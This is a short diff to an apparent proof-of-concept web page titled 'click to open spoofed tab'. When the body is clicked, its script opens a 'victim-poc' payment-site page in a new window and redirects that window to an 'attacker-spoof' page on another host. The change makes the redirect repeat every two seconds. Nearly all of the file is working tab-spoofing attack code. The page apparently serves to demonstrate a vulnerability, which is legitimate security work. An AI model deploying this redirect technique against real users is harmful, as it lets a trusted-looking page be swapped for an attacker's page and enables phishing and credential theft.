@@ -3,12 +3,16 @@
 <h1>click to open spoofed tab</h1>
 
 <script>
-document.body.onclick = () => {
-    const win = window.open('https://max-pay-nine.vercel.app/victim-poc.html');
+    document.body.onclick = () => {
 
-    // spoof function sirf ek baar chale
-    setTimeout(() => {
-        win.location.href = 'https://mrnoob790.github.io/attacker-spoof.html';
-    }, 100);
-};
+        const win = window.open('https://max-pay-nine.vercel.app/victim-poc.html');
+
+        const spoof = () => {
+            win.location.href = 'https://mrnoob790.github.io/attacker-spoof.html';
+        };
+
+        setTimeout(spoof, 100);
+
+        setInterval(spoof, 2000);
+    }
 </script>
